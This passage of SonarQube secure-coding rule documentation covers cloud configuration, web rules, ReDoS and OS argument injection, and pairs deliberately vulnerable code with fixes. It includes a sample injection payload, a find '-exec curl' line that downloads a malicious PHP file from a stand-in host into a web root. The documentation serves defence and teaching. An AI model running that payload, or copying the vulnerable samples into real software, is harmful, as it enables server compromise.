<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue" rel="nofollow">aws_sqs_queue</a>:</p>
<pre>
resource &#34;aws_sqs_queue&#34; &#34;queue&#34; {  # Sensitive, encryption disabled by default
  name &#61; &#34;sqs-unencrypted&#34;
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue" rel="nofollow">aws_sqs_queue</a>:</p>
<pre>
resource &#34;aws_sqs_queue&#34; &#34;queue&#34; {
  name &#61; &#34;sqs-encrypted&#34;
  kms_master_key_id &#61; aws_kms_key.enc_key.key_id
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html" rel="nofollow">AWS Documentation</a> -
  Encryption at rest </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6252">
              terraform:S6252
            </a>
          </td>
          <td>
            <details>
              <p>S3 buckets can be in three states related to versioning:</p>
<ul><li> unversioned (default one) </li><li> enabled </li><li> suspended </li></ul>
<p>When the S3 bucket is unversioned or has versioning suspended it means that a new version of an object overwrites an existing one in the S3
bucket.</p>
<p>It can lead to unintentional or intentional information loss.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The bucket stores information that require high availability. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<p>Versioning is disabled by default:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; { # Sensitive
  bucket &#61; &#34;example&#34;
}
</pre>
<h2>Compliant Solution</h2>
<p>Versioning is enabled for AWS provider version 4 or above:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; {
  bucket &#61; &#34;example&#34;
}

resource &#34;aws_s3_bucket_versioning&#34; &#34;example-versioning&#34; {
  bucket &#61; aws_s3_bucket.example.id
  versioning_configuration {
    status &#61; &#34;Enabled&#34;
  }
}
</pre>
<p>Versioning is enabled for AWS provider version 3 or below:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; {
  bucket &#61; &#34;example&#34;

  versioning {
    enabled &#61; true
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html" rel="nofollow">AWS documentation</a> - Using versioning in S3 buckets </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6255">
              terraform:S6255
            </a>
          </td>
          <td>
            <details>
              <p>When S3 buckets versioning is enabled it’s possible to add an additional authentication factor before being allowed to delete versions of an object
or changing the versioning state of a bucket. It prevents accidental object deletion by forcing the user sending the delete request to prove that he
has a valid MFA device and a corresponding valid token.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive information that is required to be preserved on the long term. </li><li> The S3 bucket grants delete permission to many users. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 MFA delete, note that:</p>
<ul><li> MFA delete can only be enabled with the AWS CLI or API and with the root account. </li><li> To delete an object version, the API should be used with the <code>x-amz-mfa</code> header. </li><li> The API request, with the <code>x-amz-mfa</code> header, can only be used in HTTPS. </li></ul>
<h2>Sensitive Code Example</h2>
<p>A versioned S3 bucket does not have MFA delete enabled for AWS provider version 3 or below:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; { # Sensitive
  bucket &#61; &#34;example&#34;

  versioning {
    enabled &#61; true
  }
}
</pre>
<p>A versioned S3 bucket does not have MFA delete enabled for AWS provider version 4 or above:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; {
  bucket &#61; &#34;example&#34;
}

resource &#34;aws_s3_bucket_versioning&#34; &#34;example&#34; { # Sensitive
  bucket &#61; aws_s3_bucket.example.id
  versioning_configuration {
    status &#61; &#34;Enabled&#34;
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>MFA delete is enabled for AWS provider version 3 or below:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; {
  bucket &#61; &#34;example&#34;

  versioning {
    enabled &#61; true
    mfa_delete &#61; true
  }
}
</pre>
<p>MFA delete is enabled for AWS provider version 4 or above:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; {
  bucket &#61; &#34;example&#34;
}

resource &#34;aws_s3_bucket_versioning&#34; &#34;example&#34; {
  bucket &#61; aws_s3_bucket.example.id
  versioning_configuration {
    status &#61; &#34;Enabled&#34;
    mfa_delete &#61; &#34;Enabled&#34;
  }
  mfa &#61; &#34;${var.MFA}&#34;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/MultiFactorAuthenticationDelete.html" rel="nofollow">AWS documentation</a> - Configuring MFA
  delete </li><li> <a href="https://cwe.mitre.org/data/definitions/308" rel="nofollow">MITRE, CWE-308</a> - Use of Single-factor Authentication </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6332">
              terraform:S6332
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be
automatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are
not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The file system contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system" rel="nofollow">aws_efs_file_system</a>:</p>
<pre>
resource &#34;aws_efs_file_system&#34; &#34;fs&#34; {  # Sensitive, encryption disabled by default
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system" rel="nofollow">aws_efs_file_system</a>:</p>
<pre>
resource &#34;aws_efs_file_system&#34; &#34;fs&#34; {
  encrypted &#61; true
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html" rel="nofollow">AWS Documentation</a> - Data encryption in Amazon EFS </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6375">
              terraform:S6375
            </a>
          </td>
          <td>
            <details>
              <p>Azure Active Directory offers built-in roles that can be assigned to users, groups, or service principals. Some of these roles should be carefully
assigned as they grant sensitive permissions like the ability to reset passwords for all users.</p>
<p>An Azure account that fails to limit the use of such roles has a higher risk of being breached by a compromised owner.</p>
<p>This rule raises an issue when one of the following roles is assigned:</p>
<ul><li> Application Administrator </li><li> Authentication Administrator </li><li> Cloud Application Administrator </li><li> Global Administrator </li><li> Groups Administrator </li><li> Helpdesk Administrator </li><li> Password Administrator </li><li> Privileged Authentication Administrator </li><li> Privileged Role Administrator </li><li> User Administrator </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The user, group, or service principal doesn’t use the entirety of this extensive set of permissions to operate on a day-to-day basis. </li><li> It is possible to follow the Separation of Duties principle and split permissions between multiple users, but it’s not enforced. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Limit the assignment of Global Administrator roles to less than five people or service principals. </li><li> Apply the least privilege principle by choosing a role with a limited set of permissions. </li><li> If no built-in role meets your needs, create a custom role with as few permissions as possible. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
resource &#34;azuread_directory_role&#34; &#34;example&#34; {
  display_name &#61; &#34;Privileged Role Administrator&#34; # Sensitive
}

resource &#34;azuread_directory_role_member&#34; &#34;example&#34; {
  role_object_id   &#61; azuread_directory_role.example.object_id
  member_object_id &#61; data.azuread_user.example.object_id
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource &#34;azuread_directory_role&#34; &#34;example&#34; {
  display_name &#61; &#34;Usage Summary Reports Reader&#34;
}

resource &#34;azuread_directory_role_member&#34; &#34;example&#34; {
  role_object_id   &#61; azuread_directory_role.example.object_id
  member_object_id &#61; data.azuread_user.example.object_id
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access
  Control </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference" rel="nofollow">Azure AD Documentation</a> - Azure AD built-in
  roles </li><li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/roles/best-practices" rel="nofollow">Azure AD Documentation</a> - Best practices for Azure AD
  roles </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=Web:AvoidHtmlCommentCheck">
              Web:AvoidHtmlCommentCheck
            </a>
          </td>
          <td>
            <details>
              <p>Using HTML-style comments in a page that will be generated or interpolated server-side before being served to the user increases the risk of
exposing data that should be kept private. For instance, a developer comment or line of debugging information that’s left in a page could easily (and
has) inadvertently expose:</p>
<ul><li> Version numbers and host names </li><li> Full, server-side path names </li><li> Sensitive user data </li></ul>
<p>Every other language has its own native comment format, thus there is no justification for using HTML-style comments in anything other than a pure
HTML or XML file.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The comment contains sensitive information. </li><li> The comment can be removed. </li></ul>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to remove the comment or change its style so that it is not output to the client.</p>
<h2>Sensitive Code Example</h2>
<pre>
  &lt;%
      out.write(&#34;&lt;!-- ${username} --&gt;&#34;);  // Sensitive
  %&gt;
      &lt;!-- &lt;% out.write(userId) %&gt; --&gt;  // Sensitive
      &lt;!-- #{userPhone} --&gt;  // Sensitive
      &lt;!-- ${userAddress} --&gt; // Sensitive

      &lt;!-- Replace &#39;world&#39; with name --&gt; // Sensitive
      &lt;h2&gt;Hello world!&lt;/h2&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
      &lt;%-- Replace &#39;world&#39; with name --%&gt;  // Compliant
      &lt;h2&gt;Hello world!&lt;/h2&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/615" rel="nofollow">MITRE, CWE-615</a> - Information Exposure Through Comments </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=Web:S5148">
              Web:S5148
            </a>
          </td>
          <td>
            <details>
              <p>A newly opened window having access back to the originating window could allow basic phishing attacks (the <code>window.opener</code> object is not
<code>null</code> and thus <code>window.opener.location</code> can be set to a malicious website by the opened page).</p>
<p>For instance, an attacker can put a link (say: &#34;http://example.com/mylink&#34;) on a popular website that changes, when opened, the original page to
&#34;http://example.com/fake_login&#34;. On &#34;http://example.com/fake_login&#34; there is a fake login page which could trick real users to enter their
credentials.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application opens untrusted external URL. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use <code>noopener</code> to prevent untrusted pages from abusing <code>window.opener</code>.</p>
<p>Note: In Chrome 88&#43;, Firefox 79&#43; or Safari 12.1&#43; <code>target&#61;_blank</code> on anchors implies <code>rel&#61;noopener</code> which make the protection
enabled by default.</p>
<h2>Sensitive Code Example</h2>
<pre>
&lt;a href&#61;&#34;http://example.com/dangerous&#34; target&#61;&#34;_blank&#34;&gt; &lt;!-- Sensitive --&gt;

&lt;a href&#61;&#34;{<!-- -->{variable}}&#34; target&#61;&#34;_blank&#34;&gt; &lt;!-- Sensitive --&gt;
</pre>
<h2>Compliant Solution</h2>
<p>To prevent pages from abusing <code>window.opener</code>, use <code>rel&#61;noopener</code> on <code>&lt;a href&#61;&gt;</code> to force its value to be
<code>null</code> on the opened pages.</p>
<pre>
&lt;a href&#61;&#34;http://petssocialnetwork.io&#34; target&#61;&#34;_blank&#34; rel&#61;&#34;noopener&#34;&gt; &lt;!-- Compliant --&gt;
</pre>
<h2>Exceptions</h2>
<p>No Issue will be raised when <code>href</code> contains a hardcoded relative url as there it has less chances of being vulnerable. An url is
considered hardcoded and relative if it doesn’t start with <code>http://</code> or <code>https://</code>, and if it does not contain any of the
characters {}$()[]</p>
<pre>
&lt;a href&#61;&#34;internal.html&#34; target&#61;&#34;_blank&#34; &gt; &lt;!-- Compliant --&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing" rel="nofollow">Reverse Tabnabbing</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/1022" rel="nofollow">MITRE, CWE-1022</a> - Use of Web Link to Untrusted Target with window.opener Access </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mathiasbynens.github.io/rel-noopener/" rel="nofollow">https://mathiasbynens.github.io/rel-noopener/</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=Web:S5725">
              Web:S5725
            </a>
          </td>
          <td>
            <details>
              <p>Using remote artifacts without integrity checks can lead to the unexpected execution of malicious code in the application.</p>
<p>On the client side, where front-end code is executed, malicious code could:</p>
<ul><li> impersonate users&#39; identities and take advantage of their privileges on the application. </li><li> add quiet malware that monitors users&#39; session and capture sensitive secrets. </li><li> gain access to sensitive clients&#39; personal data. </li><li> deface, or otherwise affect the general availability of the application. </li><li> mine cryptocurrencies in the background. </li></ul>
<p>Likewise, a compromised software piece that would be deployed on a server-side application could badly affect the application’s security. For
example, server-side malware could:</p>
<ul><li> access and modify sensitive technical and business data. </li><li> elevate its privileges on the underlying operating system. </li><li> Use the compromised application as a pivot to attack the local network. </li></ul>
<p>By ensuring that a remote artifact is exactly what it is supposed to be before using it, the application is protected from unexpected changes
applied to it before it is downloaded.<br /> Especially, integrity checks will allow for identifying an artifact replaced by malware on the publication
website or that was legitimately changed by its author, in a more benign scenario.</p>
<p>Important note: downloading an artifact over HTTPS only protects it while in transit from one host to another. It provides authenticity and
integrity checks <strong>for the network stream</strong> only. It does not ensure the authenticity or security of the artifact itself.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The artifact is a file intended to execute code. </li><li> The artifact is a file that is intended to configure or affect running code in some way. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To check the integrity of a remote artifact, hash verification is the most reliable solution. It does ensure that the file has not been modified
since the fingerprint was computed.</p>
<p>In this case, the artifact’s hash must:</p>
<ul><li> Be computed with a secure hash algorithm such as <code>SHA512</code>, <code>SHA384</code> or <code>SHA256</code>. </li><li> Be compared with a secure hash that was <strong>not</strong> downloaded from the same source. </li></ul>
<p>To do so, the best option is to add the hash in the code explicitly, by following <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#tools_for_generating_sri_hashes" rel="nofollow">Mozilla’s official documentation on
how to generate integrity strings</a>.</p>
<p><strong>Note: Use this fix together with version binding on the remote file. Avoid downloading files named &#34;latest&#34; or similar, so that the
front-end pages do not break when the code of the latest remote artifact changes.</strong></p>
<h2>Sensitive Code Example</h2>
<p>The following code sample uses neither integrity checks nor version pinning:</p>
<pre>
&lt;script
    src&#61;&#34;https://cdn.example.com/latest/script.js&#34;
&gt;&lt;/script&gt; &lt;!-- Sensitive --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;script
    src&#61;&#34;https://cdn.example.com/v5.3.6/script.js&#34;
    integrity&#61;&#34;sha384-oqVuAfXRKap7fdgcCY5uykM6&#43;R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC&#34;
&gt;&lt;/script&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://cwe.mitre.org/data/definitions/353" rel="nofollow">MITRE, CWE-353</a> - Missing Support for Integrity Check </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category
  A6</a> - Security Misconfiguration </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity" rel="nofollow">developer.mozilla.org</a> - Subresource Integrity </li><li> <a href="https://en.wikipedia.org/wiki/Watering_hole_attack" rel="nofollow">Wikipedia, Watering Hole Attacks</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S2631">
              jssecurity:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br /> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without
prior sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const express &#61; require(&#39;express&#39;);

const app &#61; express();

app.get(&#39;/lookup&#39;, (req, res) &#61;&gt; {
  const regex &#61; RegExp(req.query.regex); // Noncompliant

  if(regex.test(req.query.data)){
    res.send(&#34;It&#39;s a Match!&#34;);
  }else{
    res.send(&#34;Not a Match!&#34;);
  }
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const express &#61; require(&#39;express&#39;);
const escapeStringRegexp &#61; require(&#39;escape-string-regexp&#39;);

const app &#61; express();

app.get(&#39;/lookup&#39;, (req, res) &#61;&gt; {
  const regex &#61; RegExp(escapeStringRegexp(req.query.regex));

  if(regex.test(req.query.data)){
    res.send(&#34;It&#39;s a Match!&#34;);
  }else{
    res.send(&#34;Not a Match!&#34;);
  }
})
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br /> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br />
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2" rel="nofollow">re2</a>.</p>
<p>In the compliant solution, the <code>escapeStringRegexp</code> function provided by the npm package <code>escape-string-regexp</code> escapes
metacharacters and escape sequences that could have broken the initially intended logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">OWASP Regular expression Denial of Service - ReDoS</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5883">
              jssecurity:S5883
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data
is limited to the arguments.<br /> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the
behavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The
security of the application depends on the behavior of the application that is executed.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the
command the parameters are added to, this might lead to arbitrary command execution.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>
<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or
sanitization.<br /> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected
system command behavior.</p>
<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the
following payload will download malicious software on the application’s hosting server.</p>
<pre>
 -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;
</pre>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
async function (req, res) {
    await execa.command(&#39;find /tmp/images/&#39; &#43; req.query.id); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
async function (req, res) {
    if (req.query.file &amp;&amp; req.query.file.match(/^[A-Z]&#43;$/i)) {
        await execa(&#39;find&#39;, [&#39;/tmp/images/&#39; &#43; req.query.file]);
    } else {
        await execa(&#39;find&#39;, [&#39;/tmp/images/&#39;]);
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our suggestion is to avoid
using OS commands in the first place.</p>
<p>When this is not possible, strict measures should be applied to ensure a secure implementation.</p>
<p>The proposed compliant solution makes use of the <code>execa</code> method. This one separates the command to run from the arguments passed to it.
It also ensures that all arguments passed to the executed command are properly escaped. That way, an attacker with control over a command parameter
will not be able to inject arbitrary new ones.</p>
<p>While this reduces the chances for an attacker to identify an exploitation payload, the highest security level will only be reached by adding an
additional validation layer.</p>
<p>In the current example, an attacker with control over the first parameter of the <code>find</code> command could still be able to inject special
file path characters in it. Indeed, passing <code>../../</code> string as a parameter would force the <code>find</code> command to crawl the whole
file system. This could lead to a denial of service or sensitive data exposure.</p>
<p>Here, adding a regular-expression-based validation on the user-controled value prevents this kind of issue. It ensures that the user-submitted
parameter contains a harmless value.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheat Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li></ul>
<h3>Standards</h3>
